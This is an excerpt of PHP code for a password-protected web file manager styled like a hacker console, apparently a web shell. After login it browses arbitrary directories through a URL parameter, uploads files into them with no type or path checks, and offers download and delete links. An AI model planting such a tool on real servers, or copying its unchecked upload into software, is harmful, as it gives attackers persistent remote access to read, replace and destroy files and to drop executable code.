...
if (!isset($_SESSION['auth']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
    ...
    <style>body{background:#0f0f0f;color:#0f0;font-family:Consolas;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;}
    input{background:#1a1a1a;border:1px solid #0f0;color:#0f0;padding:15px;width:280px;text-align:center;}</style></head>
    <body>
...
<head>
    ...
    <title><?= $title ?> • <?= basename($dir) ?></title>
...
<div class="header">
    <h2><i class="fas fa-folder-open"></i> <?= $title ?> <small style="color:#666;">- <?= basename($dir) ?></small></h2>
    <a href="?logout=1" style="color:#f66;">Logout</a>
</div>

<div style="padding:15px;">
    <div class="path"><strong>Path:</strong> <?= htmlspecialchars($dir) ?></div>
    ...
    if (isset($_FILES['uploadfile'])) {
        $target = $dir . '/' . basename($_FILES['uploadfile']['name']);
        if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
            echo "<p style='color:#4caf50;text-align:center;'>✓ Uploaded successfully</p>";
        } else {
            echo "<p style='color:#f66;text-align:center;'>✗ Upload failed</p>";
        }
    }
    ...
    <table>
        ...
        <tr>
            <td>
                ...
                <?php else: ?>
                    <a href="?d=<?= urlencode($dir) ?>&download=<?= urlencode($file) ?>" class="file"><i class="fas fa-file"></i> <?= htmlspecialchars($file) ?></a>
                <?php endif; ?>
            </td>
            ...
            <td>
                <?php if(!$isDir): ?>
                    <a href="?del=<?= urlencode($file) ?>&d=<?= urlencode($dir) ?>" onclick="return confirm('Delete?')" style="color:#f66;">Delete</a>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
